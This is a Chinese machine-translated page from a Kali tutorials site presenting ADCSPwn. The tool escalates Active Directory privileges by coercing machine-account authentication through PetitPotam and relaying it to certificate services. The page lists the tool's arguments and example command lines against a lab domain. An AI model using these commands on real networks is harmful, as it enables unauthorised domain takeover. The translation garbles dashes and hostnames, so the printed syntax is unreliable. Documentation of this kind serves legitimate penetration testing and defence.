# ADCSPwn:通过强制从机器帐户进行身份验证并转发到证书服务来提升 Active Directory 网络中权限的工具

> 原文：<https://kalilinuxtutorials.com/adcspwn/>

[![NebulousAD : Automated Credential Auditing Tool](img/f6e67886298a9b5cbfc6f9b6ede89d2d.png "NebulousAD : Automated Credential Auditing Tool")](https://1.bp.blogspot.com/-GvP1kX66PYM/XWdJfCq5H_I/AAAAAAAACRA/BZuVZ_a-5BY8s5iRdjYszTMZ_STje-AYgCLcBGAs/s1600/NebulousAD%2B%25281%2529.png)

**ADCSPwn** 是一个工具，它通过强制从机器帐户(Petitpotam)进行身份验证并转发到证书服务来提升 active directory 网络中的权限。

**用途**

在目标网络上运行`**ADCSPwn**`。

**作者:@*batsec*–MDSec active breach
投稿人:@ flang vik–trusted sec
adcspwn.exe–ADC–port[本地端口]–remote[计算机]
必需参数:
ADC–这是认证将被中继到的 adcs 服务器的地址。
可选参数:
port–ADCs pwn 将侦听的端口。
Remote–触发认证的远程机器。
用户名–非域上下文的用户名。
密码–非域上下文的密码。
DC–查询证书模板(LDAP)的域控制器。
unc–为 EfsRpcOpenFileRaw (Petitpotam)设置自定义 UNC 回调路径。
输出–存储 base64 生成的 crt 的输出路径。
示例用法:
adcspwn.exe–ADC cs . pwnlab . local
adcspwn.exe–ADC cs . pwnlab . local–port 9001
adcspwn.exe–ADC cs . pwnlab . local–remote DC . pwnlab . local
adcspwn.exe–ADC cs . pwnlab . local–remote DC . pwnlab . local–port 9001
adcspwn.exe–ADC cs . pwnlab . local–remote DC . pwnlab . local–output C:\ t–DC DC . pwn lab . local
adcspwn.exe–ADC cs . pwn lab . local–remote DC . pwn lab . local–DC DC . pwn lab . local–unc \ WIN-work 01 . pwn lab . local \ made \ up \ share**

[**Download**](https://github.com/bats3c/ADCSPwn)